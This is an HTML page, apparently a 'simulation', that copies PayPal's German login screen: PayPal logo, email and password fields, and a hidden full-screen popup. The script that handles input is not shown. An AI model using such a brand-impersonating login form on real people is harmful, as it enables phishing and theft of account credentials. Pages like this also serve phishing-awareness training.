<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PayPal Login Simulation</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="login-container">
    <div class="logo">
      <!-- Logo wird hier eingebunden -->
      <img src="paypal-logo.png" alt="PayPal Logo">
    </div>
    <form id="loginForm">
      <div class="input-group">
        <label for="email">E-Mail-Adresse</label>
        <input type="text" id="email" placeholder="E-Mail-Adresse">
      </div>
      <div class="input-group">
        <label for="password">Passwort</label>
        <input type="password" id="password" placeholder="Passwort">
      </div>
      <button type="submit">Einloggen</button>
    </form>
  </div>

  <!-- Popup, das den ganzen Bildschirm abdeckt -->
  <div id="overlay" class="overlay hidden">
    <div class="popup">
      <!-- Logo wird auch im Popup eingebunden -->
      <div class="popup-logo">
        <img src="paypal-logo.png" alt="PayPal Logo">
      </div>
      <p id="popupMessage"></p>
    </div>
  </div>

  <script src="script.js"></script>
</body>
</html>
